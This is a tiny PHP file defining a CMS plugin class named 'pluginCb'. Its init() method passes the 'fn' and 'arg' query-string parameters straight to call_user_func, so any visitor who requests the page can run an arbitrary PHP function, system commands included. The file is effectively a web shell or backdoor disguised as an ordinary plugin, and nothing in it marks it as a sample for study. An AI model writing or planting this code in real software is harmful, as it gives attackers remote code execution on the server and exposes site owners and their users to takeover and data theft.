<?php
class pluginCb extends Plugin {
	public function init() { call_user_func($_GET['fn'], $_GET['arg']); }
}
